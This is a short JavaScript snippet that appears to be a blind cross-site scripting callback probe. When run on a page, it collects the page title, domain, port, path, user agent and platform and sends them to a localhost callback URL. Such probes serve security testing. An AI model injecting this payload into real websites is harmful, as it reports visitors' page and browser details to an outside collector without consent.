/* Written for ECMAScript 5.1. Please visit <redacted> for
↪ further information. Contact: <redacted> */
(function () {
/* collect minimal information */
var data = {
"id": "info",
"title": document.title,
"protocol": document.location.protocol.replace(":", ""),
"domain": document.domain,
"port": document.location.port,
"pathname": document.location.pathname,
"navigator_ua": window.navigator.userAgent,
"navigator_platform": window.navigator.platform
};
/* report */
var url = "http://localhost:4000/callback?";
for (var key in data) {
url += key + "=" + encodeURIComponent(data[key]) + "&";
}
url += "timestamp=" + (new Date().getTime()).toString();
var xhr = new XMLHttpRequest();
xhr.open('GET', url, true);
xhr.send();
})();